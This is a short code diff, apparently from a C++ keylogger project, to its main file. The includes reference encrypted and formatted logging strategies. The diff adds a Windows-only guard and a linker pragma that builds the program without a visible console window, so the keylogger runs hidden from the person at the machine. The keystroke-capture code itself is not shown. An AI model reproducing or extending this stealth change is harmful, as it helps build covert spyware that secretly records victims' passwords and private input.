@@ -1,3 +1,4 @@
+#ifdef _WIN32
 #include <iostream>
 #include "../include/KeyLogger.h"
 
@@ -7,6 +8,8 @@
 #include "../include/EncryptedLogStrategy.h"
 #define FORMATTEDLOG_H
 #include "../include/FormattedLogStrategy.h"
+
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
 int main(void) 
 {
@@ -26,3 +29,5 @@ int main(void)
 
     return EXIT_SUCCESS;
 }
+
+#endif // _WIN32
